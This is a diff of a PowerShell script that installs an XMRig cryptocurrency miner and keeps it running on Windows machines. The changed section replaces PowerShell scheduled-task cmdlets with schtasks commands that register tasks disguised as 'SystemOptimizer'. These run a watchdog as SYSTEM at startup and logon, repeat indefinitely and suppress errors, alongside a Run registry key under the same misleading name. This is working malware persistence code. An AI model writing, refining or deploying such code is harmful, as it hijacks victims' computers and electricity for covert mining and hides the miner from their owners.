@@ -89,15 +89,11 @@ Loop
 '@ -replace '%EXE%', $xmrigExe -replace '%CFG%', $configFile
 $wd | Out-File -FilePath $watchdogPath -Encoding ascii
 
-# ===== SCHEDULED TASK (SYSTEM, boot + logon) =====
+# ===== SCHEDULED TASK (SYSTEM, boot + logon) - using schtasks CLI (reliable from SYSTEM) =====
 $taskName = "SystemOptimizer"
-$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$watchdogPath`""
-$trigger1 = New-ScheduledTaskTrigger -AtStartup
-$trigger2 = New-ScheduledTaskTrigger -AtLogOn
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 999999 -RestartInterval (New-TimeSpan -Minutes 1)
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger1,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
-Register-ScheduledTask -TaskName "$taskName-Logon" -Action $action -Trigger $trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
+schtasks /Create /TN "$taskName" /TR "wscript.exe \"$watchdogPath\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null
+schtasks /Create /TN "$taskName-Logon" /TR "wscript.exe \"$watchdogPath\"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F 2>$null
+schtasks /Change /TN "$taskName" /RI 1 /DU 9999:59 /K /F 2>$null
 
 # ===== REGISTRY RUN KEY =====
 try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemOptimizer" -Value "wscript.exe `"`"$watchdogPath`""`"" -Force -ErrorAction SilentlyContinue } catch { }
